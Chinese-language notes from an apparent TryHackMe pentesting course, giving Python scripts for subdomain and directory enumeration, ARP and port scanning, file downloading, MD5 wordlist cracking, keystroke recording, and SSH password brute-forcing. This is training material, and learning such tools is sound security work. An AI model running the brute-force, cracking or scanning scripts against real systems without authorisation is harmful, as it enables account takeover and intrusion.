# 面向渗透测试人员的python- [面向渗透测试人员的python](#面向渗透测试人员的python)
- [面向渗透测试人员的python- 面向渗透测试人员的python](#面向渗透测试人员的python--面向渗透测试人员的python)
  - [子域枚举](#子域枚举)
  - [目录枚举](#目录枚举)
  - [网络扫描仪](#网络扫描仪)
  - [端口扫描器](#端口扫描器)
  - [文件下载器](#文件下载器)
  - [哈希破解器](#哈希破解器)
  - [键盘记录器](#键盘记录器)
  - [SSH 暴力破解](#ssh-暴力破解)


## 子域枚举
``````python
import requests 
import sys 

sub_list = open("subdomains.txt").read() 
subdoms = sub_list.splitlines()

for sub in subdoms:
    sub_domains = f"http://{sub}.{sys.argv[1]}" 

    try:
        requests.get(sub_domains)
    
    except requests.ConnectionError: 
        pass
    
    else:
        print("Valid domain: ",sub_domains)   

``````
## 目录枚举 
``````python
import requests 
import sys 

sub_list = open("wordlist.txt").read() 
directories = sub_list.splitlines()

for dir in directories:
    dir_enum = f"http://{sys.argv[1]}/{dir}.html" 
    r = requests.get(dir_enum)
    if r.status_code==404: 
        pass
    else:
        print("Valid directory:" ,dir_enum)
``````


## 网络扫描仪
``````python

from scapy.all import *

interface = "eth0"
ip_range = "10.10.X.X/24"
broadcastMac = "ff:ff:ff:ff:ff:ff"

packet = Ether(dst=broadcastMac)/ARP(pdst = ip_range) 

ans, unans = srp(packet, timeout =2, iface=interface, inter=0.1)

for send,receive in ans:
        print (receive.sprintf(r"%Ether.src% - %ARP.psrc%"))     

``````
## 端口扫描器
``````python
 
import sys
import socket
import pyfiglet


ascii_banner = pyfiglet.figlet_format("TryHackMe \n Python 4 Pentesters \nPort Scanner")
print(ascii_banner)


ip = '192.168.1.6' 
open_ports =[] 

ports = range(1, 65535)


def probe_port(ip, port, result = 1): 
  try: 
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    sock.settimeout(0.5) 
    r = sock.connect_ex((ip, port))   
    if r == 0: 
      result = r 
    sock.close() 
  except Exception as e: 
    pass 
  return result


for port in ports: 
    sys.stdout.flush() 
    response = probe_port(ip, port) 
    if response == 0: 
        open_ports.append(port) 
    

if open_ports: 
  print ("Open Ports are: ") 
  print (sorted(open_ports)) 
else: 
  print ("Looks like no ports are open :(")
``````
## 文件下载器
Linux 系统上的 Wget 或 Windows 上的 Certutil 是下载文件的有用工具。

Python 也可以用于相同的目的。

代码：
``````python
 
import requests

url = 'https://assets.tryhackme.com/img/THMlogo.png'
r = requests.get(url, allow_redirects=True)
open('THMlogo.png', 'wb').write(r.content)

这段简短的代码可以轻松地用于检索任何其他类型的文件，如下所示：
 
import requests

url = 'https://download.sysinternals.com/files/PSTools.zip'
r = requests.get(url, allow_redirects=True)
open('PSTools.zip', 'wb').write(r.content)  
``````
PSexec 允许系统管理员在远程 Windows 系统上运行命令。我们发现 PSexec 也被用于网络攻击，因为防病毒软件通常无法检测到它。您可以在此处了解有关 PSexec 的更多信息，并阅读这篇关于攻击者如何使用 PSexec 的博文。

## 哈希破解器
哈希破解器

``````python
import hashlib
import pyfiglet

ascii_banner = pyfiglet.figlet_format("TryHackMe \n Python 4 Pentesters \n HASH CRACKER for MD 5")
print(ascii_banner)

wordlist_location = str(input('Enter wordlist file location: '))
hash_input = str(input('Enter hash to be cracked: '))

with open(wordlist_location, 'r') as file:
    for line in file.readlines():
        hash_ob = hashlib.md5(line.strip().encode())
        hashed_pass = hash_ob.hexdigest()
        if hashed_pass == hash_input:
            print('Found cleartext password! ' + line.strip())
            exit(0)
``````
该脚本需要两个输入：单词列表的位置和哈希值。

您可能知道，哈希值无法破解，因为它们不包含明文值。与可以“反转”（例如解密）的加密值不同，散列的明文值只能从潜在明文值列表开始找到。一个简化的过程如下所示；

您从数据库中检索哈希值“eccbc87e4b5ce2fe28308fd9f2a7baf3”，您怀疑该值是 1 到 5 之间的数字的哈希值。
- 您创建一个包含可能的明文值（从 1 到 5 的数字）的文件
- 您为明文列表中的值生成哈希列表（1 到 5 之间的数字的哈希值）
- 将生成的哈希值与手头的哈希值进行比较（匹配数字 3 的哈希值）
- 显然，可以设计更有效的流程，但主要原理保持不变。

下面的脚本遵循与上述方法接近的方法；

- 询问单词列表的位置
- 要求破解哈希值
- 从单词列表中读取值（每行一个）
- 将明文值转换为 MD5 哈希值
- 将生成的 MD5 哈希值与用户输入的值进行比较

## 键盘记录器

模块让我们能够用简单的方式解决相对困难的问题。

一个很好的例子是“键盘”模块，它允许我们与键盘进行交互。

如果您的系统上没有“键盘”模块，我们可以使用 pip3 来安装它。
pip3 install keyboard   

使用键盘模块，以下三行代码足以记录和重播按下的按键：
``````
import keyboard
keys = keyboard.record(until ='ENTER')
keyboard.play(keys)
``````
“keyboard.record”将记录按键直到按下 ENTER，“keyboard.play”将重播它们。由于此脚本正在记录击键，因此也将看到使用退格键进行的任何编辑。

## SSH 暴力破解
强大的 Python 语言受到许多模块的支持，可以轻松扩展其功能。Paramiko 是一个 SSHv2 实现，可用于构建 SSH 客户端和服务器。

下面的示例显示了构建 SSH 密码暴力攻击脚本的一种方法。正如编程中常见的情况一样，此类应用程序很少有单一的正确答案。作为渗透测试人员，您对编程语言的使用对于开发人员来说会有所不同。虽然他们可能关心最佳实践和代码卫生，但您的目标通常是最终获得按您希望的方式工作的代码。

现在，您应该熟悉“try”和“ except”语法。该脚本有一个新功能“def”。“Def”允许我们创建自定义函数，如下所示。“ssh_connect”函数不是 Python 原生的，而是使用 Paramiko 和“paramiko.SSHClient()”函数构建的。
``````python
import paramiko
import sys
import os

target = str(input('Please enter target IP address: '))
username = str(input('Please enter username to bruteforce: '))
password_file = str(input('Please enter location of the password file: '))

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

with open(password_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        
        try:
            response = ssh_connect(password)

            if response == 0:
                 print('password found: '+ password)
                 exit(0)
            elif response == 1: 
                print('no luck')
        except Exception as e:
            print(e)
        pass

input_file.close()
``````
